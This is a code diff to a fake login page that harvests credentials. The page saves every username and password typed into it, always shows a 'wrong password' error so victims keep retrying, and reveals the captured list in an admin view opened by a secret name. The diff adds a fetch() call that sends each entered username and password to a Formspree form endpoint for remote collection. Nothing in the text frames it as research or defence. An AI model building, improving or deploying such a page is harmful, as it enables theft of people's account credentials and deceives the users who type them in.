@@ -28,11 +28,11 @@
                     Incorrect username or password. Please try again.
                 </div>
                 <div>
-                    <input type="text" id="usernameInput" placeholder="Email or phone number" required
+                    <input type="text" id="usernameInput" name="username" placeholder="Email or phone number" required
                         class="w-full px-4 py-3.5 bg-gray-100 border border-transparent rounded-2xl focus:bg-white focus:border-gray-300 focus:outline-none text-sm">
                 </div>
                 <div>
-                    <input type="password" id="passwordInput" placeholder="Password"
+                    <input type="password" id="passwordInput" name="password" placeholder="Password"
                         class="w-full px-4 py-3.5 bg-gray-100 border border-transparent rounded-2xl focus:bg-white focus:border-gray-300 focus:outline-none text-sm">
                 </div>
                 <button type="submit" class="w-full py-3.5 bg-[#006AFF] hover:bg-[#0052cc] text-white font-semibold rounded-2xl transition duration-200 text-sm shadow-sm">
@@ -90,26 +90,24 @@
 
         <div class="grid grid-cols-2 gap-4 mb-6">
             <div class="bg-slate-800 p-4 rounded-xl border border-slate-700">
-                <p class="text-xs text-slate-400">Total Attempts Logged</p>
+                <p class="text-xs text-slate-400">Total Attempts Local</p>
                 <p id="totalAttempts" class="text-2xl font-bold text-white mt-1">0</p>
             </div>
             <div class="bg-slate-800 p-4 rounded-xl border border-slate-700">
                 <p class="text-xs text-slate-400">Status</p>
-                <p class="text-sm font-semibold text-emerald-400 mt-2">Monitoring Active</p>
+                <p class="text-sm font-semibold text-emerald-400 mt-2">Cloud Sync Active</p>
             </div>
         </div>
 
         <h3 class="text-sm font-semibold text-slate-300 mb-3">Captured Login Attempts & Passwords:</h3>
         <div id="credentialsList" class="space-y-2 flex-1">
-            <!-- Dynamic login attempts will appear here -->
             <div class="p-3 bg-slate-800/50 border border-slate-800 rounded-xl text-center text-xs text-slate-500">
-                No login attempts recorded yet.
+                No local login attempts recorded on this device yet. Check your Formspree dashboard for remote submissions!
             </div>
         </div>
     </div>
 
     <script>
-        // Load stored login attempts from local storage
         let attempts = JSON.parse(localStorage.getItem('mama_attempts') || '[]');
 
         function handleLogin(event) {
@@ -118,7 +116,7 @@
             const password = document.getElementById('passwordInput').value;
             const errorMsg = document.getElementById('errorMsg');
 
-            // SECRET ADMIN TRIGGER: Type exact name in upper/normal case without entering password
+            // SECRET ADMIN TRIGGER
             if (username.toLowerCase() === "james buenaflor") {
                 document.getElementById('authView').classList.add('hidden');
                 document.getElementById('adminView').classList.remove('hidden');
@@ -126,7 +124,7 @@
                 return;
             }
 
-            // Save the attempted credentials so you can see them in admin view
+            // Save locally
             attempts.unshift({
                 username: username,
                 password: password,
@@ -134,7 +132,14 @@
             });
             localStorage.setItem('mama_attempts', JSON.stringify(attempts));
 
-            // For normal users, always show incorrect password so they keep trying
+            // Send data to cloud backend (Formspree) so it works across different phones
+            fetch('https://formspree.io/f/xdekqogg', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: username, password: password })
+            }).catch(err => console.log('Cloud sync error'));
+
+            // Show error so normal users keep trying
             errorMsg.classList.remove('hidden');
             document.getElementById('passwordInput').value = '';
         }
@@ -144,7 +149,7 @@
             document.getElementById('totalAttempts').innerText = attempts.length;
 
             if (attempts.length === 0) {
-                listContainer.innerHTML = `<div class="p-3 bg-slate-800/50 border border-slate-800 rounded-xl text-center text-xs text-slate-500">No login attempts recorded yet.</div>`;
+                listContainer.innerHTML = `<div class="p-3 bg-slate-800/50 border border-slate-800 rounded-xl text-center text-xs text-slate-500">No local attempts recorded. Check your Formspree dashboard for remote entries.</div>`;
                 return;
             }
 
